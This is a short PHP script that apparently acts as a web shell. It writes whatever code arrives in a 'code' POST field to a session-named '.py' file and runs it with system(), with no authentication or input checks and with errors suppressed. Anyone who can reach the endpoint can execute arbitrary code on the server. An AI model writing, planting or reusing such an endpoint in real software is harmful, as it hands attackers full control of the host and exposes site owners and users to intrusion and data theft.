<?php session_start();
    error_reporting(E_ERROR);
	$filename = "db".session_id().".py";
	if(isset($_GET['action']) && isset($_POST['code'])){
        file_put_contents ($filename, $_POST['code']);
        system ($filename);
	}
?>
